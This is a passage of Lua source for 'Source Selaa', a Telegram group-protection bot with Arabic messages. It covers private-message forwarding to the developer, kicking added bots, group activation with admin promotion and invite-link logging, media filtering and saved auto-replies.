local inline = {{{text="⌁ ︙ المطور ︙ ⌁",url="t.me/"..(dp.username_ or "sourcesela")}}}
local start = Selaa:get(Selaa.."Selaa:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "↯☆مرحبا انا بوت اسمي "..NameBot.."\n↯☆اختصاصي حماية المجموعات\n↯☆من التفليش والسبام والخخ .. . ،\n↯☆تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ⇇ تفعيل\n↯☆سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
SendInline(msg.chat_id_,Start_Source,nil,inline)
end,nil)
end
Selaa:setex(Selaa..'Selaa:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source Selaa     --
if not Sudo(msg) and not Selaa:sismember(Selaa..'Selaa:Ban:Pv',msg.sender_user_id_) and not Selaa:get(Selaa..'Selaa:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Selaa(msg.sender_user_id_, msg.id_, 1, '↯☆تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "sourcesela")..')', 1, 'md') 
tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
SendText(DevId,'↯☆تم ارسال الملصق من ⇇ ⤈\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end
if Sudo(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' or text == 'حضر' then
local Text = '↯☆العضو ⇇ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n↯☆تم حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
Selaa:sadd(Selaa..'Selaa:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '↯☆العضو ⇇ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n↯☆تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
Selaa:srem(Selaa..'Selaa:Ban:Pv',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو قام بحظر البوت لا تستطيع ارسال الرسائل له', 1, 'md')
return false  
end 
if text then
Selaa(id_user, 0, 1, text, 1, "md")  
Text = '↯☆تم ارسال الرساله الى ⇇ ⤈'
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = '↯☆تم ارسال الملصق الى ⇇ ⤈'
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = '↯☆تم ارسال الصوره الى ⇇ ⤈'
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = '↯☆تم ارسال المتحركه الى ⇇ ⤈'
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = '↯☆تم ارسال البصمه الى ⇇ ⤈'
end     
SendText(DevId, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);
end,nil);
end,nil);
end,nil);
end 
end 
--     Source Selaa     --
if text and Selaa:get(Selaa..'Selaa:Start:Bots') then
if text == 'الغاء' then   
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء حفظ كليشة الستارت', 1, 'md')
Selaa:del(Selaa..'Selaa:Start:Bots') 
return false
end
Selaa:set(Selaa.."Selaa:Start:Bot",text)  
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم حفظ كليشة الستارت', 1, 'md')
Selaa:del(Selaa..'Selaa:Start:Bots') 
return false
end
if Sudo(msg) then
if text == 'تعيين رد الخاص' or text == 'ضع كليشه ستارت' or text == '⇇ تعيين رد الخاص ⌁' then 
Selaa:set(Selaa..'Selaa:Start:Bots',true) 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆ارسل لي كليشة الستارت الان', 1, 'md')
return false
end
if text == 'حذف رد الخاص' or text == 'حذف كليشه ستارت' or text == '⇇ حذف رد الخاص ⌁' then 
Selaa:del(Selaa..'Start:Bot') 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم حذف كليشة الستارت بنجاح', 1, 'md')
end
if text == 'جلب رد الخاص' then  
local start = Selaa:get(Selaa.."Selaa:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "↯☆مرحبا انا بوت اسمي "..NameBot.."\n↯☆اختصاصي حماية المجموعات\n↯☆من التفليش والسبام والخخ .. . ،\n↯☆تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ⇇ تفعيل\n↯☆سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
Selaa(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end
if text == 'تفعيل التواصل' or text == '⇇ تفعيل التواصل ⌁' then   
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل التواصل بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Texting:Pv') 
end
if text == 'تعطيل التواصل' or text == '⇇ تعطيل التواصل ⌁' then  
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل التواصل بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Texting:Pv',true) 
end
end
--     Source Selaa     --
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then 
Selaa:incr(Selaa..'Selaa:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
Selaa:set(Selaa.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = Selaa:get(Selaa.."Selaa:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "kick" and not VipMem(msg) then   
https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "del" and not VipMem(msg) then   
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "ked" and not VipMem(msg) then
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
Selaa:sadd(Selaa..'Selaa:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(Selaa) then 
Selaa:srem(Selaa.."Selaa:Groups", msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
SendText(DevId,"↯☆تم طرد البوت من المجموعه ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆بواسطة ⇇ "..Name.."\n↯☆اسم المجموعه ⇇ ["..NameChat.."]\n↯☆ايدي المجموعه ⇇ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆الوقت ⇇ "..os.date("%I:%M%p").."\n↯☆التاريخ ⇇ "..os.date("%Y/%m/%d").."",0,'md')
end,nil)
end,nil)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if Selaa:get(Selaa..'Selaa:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
--     Source Selaa     --
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
text = msg.content_.text_ 
--     Source Selaa     --
if text ==('تفعيل') and not SudoBot(msg) and SourceCh(msg) then
if not Selaa:get(Selaa..'Selaa:Lock:FreeBot'..Selaa) then
if ChatType == 'pv' then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لاتستطيع تفعيلي هنا يرجى اضافتي في مجموعه اولا', 1, 'md')
return false
end
if ChatType ~= 'sp' then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,ChatMem) 
if ChatMem and ChatMem.status_.ID == "ChatMemberStatusEditor" or ChatMem and ChatMem.status_.ID == "ChatMemberStatusCreator" then
if ChatMem and ChatMem.user_id_ == msg.sender_user_id_ then
if ChatMem.status_.ID == "ChatMemberStatusCreator" then
status = 'منشئ'
elseif ChatMem.status_.ID == "ChatMemberStatusEditor" then
status = 'ادمن'
else 
status = 'عضو'
end
Selaa:del(Selaa..'Selaa:SelaaConstructor:'..msg.chat_id_)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
Selaa:sadd(Selaa..'Selaa:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
Selaa:sadd(Selaa..'Selaa:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
Selaa:sadd(Selaa.."Selaa:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
Selaa:sadd(Selaa.."Selaa:SelaaConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
Selaa:srem(Selaa.."Selaa:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
Selaa:srem(Selaa.."Selaa:SelaaConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if Selaa:sismember(Selaa..'Selaa:Groups',msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(Selaa:get(Selaa..'Selaa:Num:Add:Bot') or 0) and not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆عدد اعضاء المجموعه اقل من ⇇ *'..(Selaa:get(Selaa..'Selaa:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyAdd","↯☆تم تفعيل المجموعه "..dp.title_)  
Selaa:sadd(Selaa.."Selaa:Groups",msg.chat_id_)
Selaa:sadd(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
Selaa:set(Selaa.."Selaa:Groups:Links"..msg.chat_id_,LinkGroup) 
SendText(DevId,"↯☆تم تفعيل مجموعه جديده ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆بواسطة ⇇ "..Name.."\n↯☆موقعه في المجموعه ⇇ "..status.."\n↯☆اسم المجموعه ⇇ ["..NameChat.."]\n↯☆عدد اعضاء المجموعه ⇇ ❨ *"..NumMem.."* ❩\n↯☆ايدي المجموعه ⇇ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n↯☆رابط المجموعه ⇇ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆الوقت ⇇ "..os.date("%I:%M%p").."\n↯☆التاريخ ⇇ "..os.date("%Y/%m/%d").."",0,'md')
end
end end
end,nil)
end,nil)
end,nil)
end,nil)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا تستطيع تفعيل هذه المجموعه بسبب تعطيل البوت الخدمي من قبل المطور الاساسي', 1, 'md') 
end 
end 
--     Source Selaa     --
if msg.date_ < (os.time() - 30) then
print("*( OLD MESSAGE )*")
return false
end
--     Source Selaa     --
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
Selaa:set(Selaa..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source Selaa     --
local idf = tostring(msg.chat_id_)
if not Selaa:sismember(Selaa.."Selaa:Groups",msg.chat_id_) and not idf:match("^(%d+)") and not SudoBot(msg) then
print("Return False [ Not Enable ]")
return false
end
--     Source Selaa     --
-------- MSG TYPES ---------
if msg.content_ then
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" then
print("This is [ Inline ]")
msg_type = 'MSG:Inline'
end
--     Source Selaa     --
if msg.content_.ID == "MessageText" then
text = msg.content_.text_
print("This is [ Text ]")
msg_type = 'MSG:Text'
end
--     Source Selaa     --
if msg.content_.ID == "MessageChatJoinByLink" and not VipMem(msg) then 
if Selaa:get(Selaa.."Selaa:Lock:Join"..msg.chat_id_) then
ChatKick(msg.chat_id_,msg.sender_user_id_) 
return false  
end
end
if msg.content_.ID == "MessagePhoto" then
if not Manager(msg) then 
local filter = Selaa:smembers(Selaa.."Selaa:FilterPhoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆عذرا عزيزي ⇇ [@"..data.username_.."]\n↯☆الصوره التي ارسلتها تم منعها من المجموعه", 1, 'md')
else
Selaa(msg.chat_id_, msg.id_, 1, "↯☆عذرا عزيزي ⇇ ["..data.first_name_.."](T.ME/sourcesela)\n↯☆الصوره التي ارسلتها تم منعها من المجموعه", 1, 'md')
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageAnimation" then
if not Manager(msg) then 
local filter = Selaa:smembers(Selaa.."Selaa:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆عذرا عزيزي ⇇ [@"..data.username_.."]\n↯☆المتحركه التي ارسلتها تم منعها من المجموعه", 1, 'md')
else
Selaa(msg.chat_id_, msg.id_, 1, "↯☆عذرا عزيزي ⇇ ["..data.first_name_.."](T.ME/sourcesela)\n↯☆المتحركه التي ارسلتها تم منعها من المجموعه", 1, 'md')
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageSticker" then
if not Manager(msg) then 
local filter = Selaa:smembers(Selaa.."Selaa:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
Selaa(msg.chat_id_,0, 1, "↯☆عذرا عزيزي ⇇ [@"..data.username_.."]\n↯☆الملصق الذي ارسلته تم منعه من المجموعه", 1, 'md')
else
Selaa(msg.chat_id_,0, 1, "↯☆عذرا عزيزي ⇇ ["..data.first_name_.."](T.ME/sourcesela)\n↯☆الملصق الذي ارسلته تم منعه من المجموعه", 1, 'md')
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
--     Source Selaa     --
if msg.content_.ID == "MessagePhoto" then
print("This is [ Photo ]")
msg_type = 'MSG:Photo'
end
--     Source Selaa     --
if msg.content_.ID == "MessageChatAddMembers" then
print("This is [ New User Added ]")
msg_type = 'MSG:NewUserAdd'
end
--     Source Selaa     --
if msg.content_.ID == "MessageDocument" then
print("This is [ File Or Document ]")
msg_type = 'MSG:Document'
end
--     Source Selaa     --
if msg.content_.ID == "MessageSticker" then
print("This is [ Sticker ]")
msg_type = 'MSG:Sticker'
end
--     Source Selaa     --
if msg.content_.ID == "MessageAudio" then
print("This is [ Audio ]")
msg_type = 'MSG:Audio'
end
--     Source Selaa     --
if msg.content_.ID == "MessageVoice" then
print("This is [ Voice ]")
msg_type = 'MSG:Voice'
end
--     Source Selaa     --
if msg.content_.ID == "MessageVideo" then
print("This is [ Video ]")
msg_type = 'MSG:Video'
end
--     Source Selaa     --
if msg.content_.ID == "MessageAnimation" then
print("This is [ Gif ]")
msg_type = 'MSG:Gif'
end
--     Source Selaa     --
if msg.content_.ID == "MessageLocation" then
print("This is [ Location ]")
msg_type = 'MSG:Location'
end
--     Source Selaa     --
if not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
print("This is [ MarkDown ]")
msg_type = 'MSG:MarkDown'
end
--     Source Selaa     --
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By Link ]")
msg_type = 'MSG:JoinByLink'
end
--     Source Selaa     --
if msg.content_.ID == "MessageContact" then
print("This is [ Contact ]")
msg_type = 'MSG:Contact'
end
---
end
--     Source Selaa     --
if ((not d) and chat) then
if msg.content_.ID == "MessageText" then
do_notify (chat.title_, msg.content_.text_)
else
do_notify (chat.title_, msg.content_.ID)
end
end
--     Source Selaa     --
if msg.content_.text_ then
local DelGpRed = Selaa:get(Selaa..'Selaa:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
if DelGpRed == 'DelGpRed' then
Selaa(msg.chat_id_, msg.id_, 1,'↯☆الكلمه ⇇ '..msg.content_.text_..' تم حذفها',  1, "html")
Selaa:del(Selaa..'Selaa:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
Selaa:del(Selaa..'Selaa:Gif:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Selaa:del(Selaa..'Selaa:Voice:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Selaa:del(Selaa..'Selaa:Audio:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Selaa:del(Selaa..'Selaa:Photo:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Selaa:del(Selaa..'Selaa:Stecker:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Selaa:del(Selaa..'Selaa:Video:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Selaa:del(Selaa..'Selaa:File:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Selaa:del(Selaa..'Selaa:Text:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Selaa:srem(Selaa..'Selaa:Manager:GpRed'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
if msg.content_.text_ then
local DelAllRed = Selaa:get(Selaa.."Selaa:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Selaa(msg.chat_id_, msg.id_, 1,'↯☆الكلمه ⇇ '..msg.content_.text_..' تم حذفها',  1, "html")
Selaa:del(Selaa.."Selaa:Add:AllRed"..msg.sender_user_id_)
Selaa:del(Selaa.."Selaa:Gif:AllRed"..msg.content_.text_)
Selaa:del(Selaa.."Selaa:Voice:AllRed"..msg.content_.text_)
Selaa:del(Selaa.."Selaa:Audio:AllRed"..msg.content_.text_)
Selaa:del(Selaa.."Selaa:Photo:AllRed"..msg.content_.text_)
Selaa:del(Selaa.."Selaa:Stecker:AllRed"..msg.content_.text_)
Selaa:del(Selaa.."Selaa:Video:AllRed"..msg.content_.text_)
Selaa:del(Selaa.."Selaa:File:AllRed"..msg.content_.text_)
Selaa:del(Selaa.."Selaa:Text:AllRed"..msg.content_.text_)
Selaa:del(Selaa.."Selaa:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     Source Selaa     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = Selaa:get(Selaa..'Selaa:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = Selaa:get(Selaa..'DelManagerRep'..msg.chat_id_..'')
Selaa:srem(Selaa..'Selaa:Manager:GpRed'..msg.chat_id_..'',DelManagerRep)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء حفظ الرد', 1, 'md')
Selaa:del(Selaa..'Selaa:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'')
Selaa:del(Selaa..'Selaa:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_)
Selaa:del(Selaa..'DelManagerRep'..msg.chat_id_..'')
return false
end
Selaa:del(Selaa..'Selaa:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
local SaveGpRed = Selaa:get(Selaa..'Selaa:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'')
if msg.content_.video_ then Selaa:set(Selaa..'Selaa:Video:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then Selaa:set(Selaa..'Selaa:File:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then Selaa:set(Selaa..'Selaa:Stecker:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.sticker_.sticker_.persistent_id_) 
end 
